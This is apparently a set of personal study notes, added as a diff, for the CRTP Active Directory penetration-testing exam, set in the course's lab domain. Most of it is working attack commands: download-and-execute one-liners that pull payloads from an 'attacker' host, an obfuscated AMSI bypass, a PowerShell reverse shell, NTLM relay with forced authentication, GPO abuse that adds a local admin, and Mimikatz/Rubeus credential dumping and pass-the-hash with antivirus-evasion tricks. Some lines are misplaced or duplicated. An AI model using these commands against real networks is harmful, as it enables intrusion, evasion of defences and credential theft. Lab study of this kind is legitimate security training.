@@ -1,0 +1,513 @@
+# CRTP notes to pass an exam 
+
+## Windows
+
+:toc:
+:toclevels: 3
+
+== Table of Contents
+- <<overview,Overview>>
+- <<scripts, PowerShell Scripts>>
+- <<file, File Transfering>>
+- <<amsi, AmsiTrigger>>
+- <<InviShell, InviShell>>
+- <<PowerView, PowerView>>
+- <<bloodhound, Bloodhound>>
+- <<smbshare, Write SMB>>
+- <<local, Local PrivEsc>>
+- <<reverse, Reverse Shells>>
+- <<ldap, Ldap Shell>>
+- <<cred, Credentials Dumping>>
+- <<registry, Windows registry>>
+- <<AV, AV bypass>>
+
+
+
+[[overview]]
+== Overview
+
+It will be a compressed notes with commands , expoitation and some explanation. I wish that i pass CRTP with my methodology and this notes
+
+[[scripts]]
+== PowerShell Scripts
+
+Load a PowerShell script using dot sourcing
+
+```bash
+. C:\AD\Tools\PowerView.ps1
+```
+
+A module (or a script) can be imported with:
+
+```bash
+Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
+```
+
+All the commands in a module can be listed with
+
+```bash
+Get-Command -Module <modulename>
+```
+
+[[file]]
+== File Transfering
+
+Download file to target machine and execute it in *MEMORY* that means that file is not downloaded to disk
+
+```bash
+iex (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')
+```
+
+The same but anouther way 
+
+```bash
+iex (iwr 'http://attacker/payload.ps1')
+```
+
+If Windows alert this `running scripts is disabled` we need to bypass by commands below. So it's a protect of random script execution *ExecutionPolicy*
+
+```bash
+powershell -ExecutionPolicy bypass
+```
+
+Copy a file between machines in domain
+
+```bash
+xcopy C:\AD\Tools\studentx.lnk \\dcorp-ci\AI
+```
+
+Copy locally
+
+```bash
+Copy-Item C:\AD\Tools\Invoke-MimiEx-keys-stdx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
+```
+
+[[amsi]]
+== AmsiTrigger
+
+find AMSI detection triggers in PowerShell scripts
+
+```bash
+AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke-PowerShellTcp_Detected.ps1
+DefenderCheck.exe PowerUp.ps1
+```
+
+AMSI bypass
+
+```bash
+S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+```
+
+[[InviShell]]
+== InviShell
+
+InviShell is used to Bypass PowerShell security logging.
+
+```bash
+cd \AD\Tools
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+```
+
+[[PowerView]]
+== PowerView
+
+PowerView is used for an Active Directory enumeration so it is very powerfull tool. Run a `PowerView` in `Invisi-Shell` to avoid logging 
+
+Return all users in a domain and info LDAP
+
+```bash
+Get-DomainUser
+```
+
+To list only a names *samaccountname*
+
+```bash
+Get-DomainUser | select -ExpandProperty samaccountname
+```
+
+To enumerate member computers in the domain we can use Get-DomainComputer
+
+```bash
+Get-DomainComputer | select -ExpandProperty dnshostname
+```
+
+See datails about a group
+
+```bash
+Get-DomainGroup -Identity "Domain Admins"
+```
+
+Members of a group
+
+```bash
+Get-DomainGroupMember -Identity "Domain Admins"
+```
+
+Return all users and groups which exist in target 
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+
+. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
+
+Find-PSRemotingLocalAdminAccess
+```bash
+Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local
+```
+
+Enumerate ACLs for the Domain Admins Group
+
+```bash
+Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose
+```
+
+Find ACLs which user `studentx` has
+
+```bash
+Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "studentx"}
+```
+
+Check ACLs for a `RDPUsers` group
+
+```bash
+Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
+```
+
+List all the OUs and only names of OUs
+
+```bash
+Get-DomainOU
+Get-DomainOU | select -ExpandProperty name
+```
+
+List all computers in `DevOps` OU
+
+```bash
+(Get-DomainOU -Identity DevOps).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
+```
+
+List a GPOs and list a single GPO info
+
+```bash
+Get-DomainGPO
+Get-DomainGPO -Identity '{0BF8D01C-1F62-4BDC-958C-57140B67D147}'
+```
+
+Find which GPOs are linked to an OU.C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+
+. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
+
+Find-PSRemotingLocalAdminAccess
+
+```bash
+(Get-DomainOU -Identity DevOps).gplink
+```
+
+Enumerate all domains in the current forest
+
+```bash
+Get-ForestDomain -Verbose
+```
+
+Map all trusts of the domain
+
+```bash
+Get-DomainTrust
+```
+
+Enumerate trust relationships between domains.TrustAttributes = FILTER_SIDS -> SID filtering is enabled.
+
+```bash
+Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
+```
+
+Identify external trusts with SID filtering enabled.
+
+```bash
+Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
+```
+
+Enumerate trusts for eurocorp.local forest
+
+```bash
+Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}
+```
+
+Find computers where specific users are logged in
+
+```bash
+Find-DomainUserLocation
+```
+
+
+[[bloodhound]]
+== Bloodhound
+
+Install and start `neo4j` 
+
+```bash
+neo4j.bat install-service
+neo4j.bat start
+```
+
+Default username and password
+
+```bash
+neo4j : neo4j
+```
+
+Open Bloodhound and run `BloodHound.exe`
+
+```bash
+C:\AD\Tools\BloodHound-win32-x64\BloodHound-win32-x64
+```
+
+Collect all info abount domain by `SharpHound.exe`
+
+```bash
+C:\AD\Tools\BloodHound-master\BloodHound-master\Collectors\SharpHound.exe --collectionmethods Group,GPOLocalGroup,Session,Trusts,ACL,Container,ObjectProps,SPNTargets --excludedcs
+```
+
+After AMSI bypassing it will be possible to collect info with an `Invoke-BloodHound`
+
+```bash
+Invoke-BloodHound -CollectionMethod All
+```
+
+[[smbshare]]
+== Write SMB
+
+Don't scan a DC to be more `OPSEC`. Also do this in `Invisi-Shell`. `PowerHuntShares.psm1` is used to find a `SMB Shares` in computers where current user has a write permissions
+
+Import
+
+```bash
+Import-Module C:\AD\Tools\PowerHuntShares.psm1
+```
+
+Execution
+
+```bash
+Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools\ -HostList C:\AD\Tools\servers.txt
+```
+
+[[local]]
+== Local PrivEsc
+
+Something simmular to `WinPEAS` to find a privilege escalation path or misconfigs. Also CRTP tells us to use `InviShell` for each `powershell` script
+
+```bash
+. C:\AD\Tools\PowerUp.ps1
+```
+
+Try to find 
+
+```bash
+Invoke-AllChecks
+```
+
+If we find some misconfiguration. In this case the current domain user has access to add himself to local Administrators group.
+
+```bash
+Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
+```
+
+Also CRTP gives as a obfuscated version of `WinPEAS` to avoid detections by Defender. Also we have a new tool for me it's `Loader.exe` and this program creates *"proxy"* for exutable .exe and it's done again to avoid Defender, AMSI and other security.
+
+```bash
+C:\AD\Tools\Loader.exe -Path C:\AD\Tools\winPEASx64.exe -args notcolor log
+```
+
+Find where a current user has a local administrative privileges in the domain
+
+Import
+
+```bash
+. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
+```
+
+Execution
+
+```bash
+Find-PSRemotingLocalAdminAccess
+```
+
+If we find some machines in which current user has a admin privileges we can connect to it from student machine
+
+```bash
+winrs -r:dcorp-adminsrv cmd
+set username
+set computername
+```
+
+For the same task can be used a `PowerShell Remoting` 
+
+```bash
+Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
+```
+
+The same as `RunasCS.exe` for me
+
+```bash
+runas /user:dcorp\studentx /netonly cmd
+```
+
+`gpmc.msc` allows as to modify a GPO , read Group Policy.
+
+```bash
+gpmc.msc
+```
+
+Update Group Policy
+
+```bash
+gpupdate /force
+```
+
+Get info about the target system in domain via `WMI`
+
+```bash
+Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc
+```
+
+Access to `WMI` in target machine 
+
+```bash
+Set-RemoteWMI -SamAccountName studentx -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
+```
+
+[[reverse]]
+== Reverse Shells
+
+Simple reverse shell to avoid a Defender and AMSI. Also don't forget about firewall we can only run `reverse shell` on 80 or 443 ports
+
+```bash
+powershell.exe iex (iwr http://attacker_ip/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress attacker_ip -Port attacker_port
+```
+
+Start listener on VM 
+
+```bash
+C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
+```
+
+[[ldap]]
+== Ldap Shell
+
+If i gain a ldap shell as more privileged user commonly it is gained by `NTLM` relay attack i will use impacket
+
+```bash
+sudo impacket-ntlmrelayx -t ldaps://172.16.2.1 -wh 172.16.100.x --http-port '80,8080' -i --no-smb-server
+```
+
+So here we force victim to auth to our listener and then go to ldaps in `-t` option Man-In-The-Middle attack. And below commands to force auth
+
+```bash
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://172.16.100.x' -UseDefaultCredentials"
+```
+
+It is a good attack when we don't know a credentials but have a reverse shell
+
+Connection to LDAP shell a port written at the end of `impacket-ntlmrelayx` output
+
+```bash
+rlwrap nc 127.0.0.1 11000
+```
+
+In LDAP shell. I wouldn't give all commands in `ldap_shell` so after succesfull connection type `help` or read https://github.com/PShlyundin/ldap_shell[this]
+
+Now the complicated attack we modify a GPO and add a malicious scheduled task to all machines in target GPO task is
+
+Add current user to localadmins group
+
+```bash
+sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' \
+--domain 'dollarcorp.moneycorp.local' \
+--username 'studentx' \
+--password 'gG38Ngqym2DpitXuGrsJ' \
+--command 'net localgroup administrators studentx /add' \
+```
+
+
+Hunt a session of users in all remote machines in a domain 
+
+```bash
+Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access
+```
+
+[[cred]]
+== Credentials Dumping
+
+Note that all malicious .exe file must be executed throught `Loader.exe` to avoid Defender
+
+Create a listener in Windows machine 
+
+```bash
+$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"
+```
+
+`SafetyKatz.exe` it's a secure version of `mimikatz.exe` i prefer to use it 
+
+```bash
+$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
+```
+
+*OverPass-the-Hash* attack using a `rubeus.exe` but for me it's the same as `impacket-getTGT`
+
+```bash
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
+Alternative
+
+```bash
+impacket-getTGT dollarcorp.moneycorp.local/svcadmin -aesKey 6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
+```
+
+At the result we got a `svcadmin.ccache`
+
+[[registry]]
+== Windows registry
+
+Read data from Windows Registry
+
+```bash
+reg query
+```
+
+[[AV]]
+== AV bypass
+
+There is a technique that CRTP course provided
+
+Create *Invoke-MimiEx-keys-stdx.ps1*
+
+1.Create a copy of Invoke-Mimi.ps1 and rename it to Invoke-MimiEx-keys-stdx.ps1 (where x is your student ID).
+2.Open Invoke-MimiEx-keys-stdx.ps1 in PowerShell ISE (Right click on it and click Edit).
+3.Add the below encoded value for "sekurlsa::ekeys" to the end of the file.
+
+```bash
+$8 = "s";
+$c = "e";
+$g = "k";
+$t = "u";
+$p = "r";
+$n = "l";
+$7 = "s";
+$6 = "a";
+$l = ":";
+$2 = ":";
+$z = "e";
+$e = "k";
+$0 = "e";
+$s = "y";
+$1 = "s";
+$Pwn = $8 + $c + $g + $t + $p + $n + $7 + $6 + $l + $2 + $z + $e + $0 + $s + $1 ;
+Invoke-Mimi -Command $Pwn
+```
+
+We can do it for other tools but need to remember this method
+
+
+
+
+
+
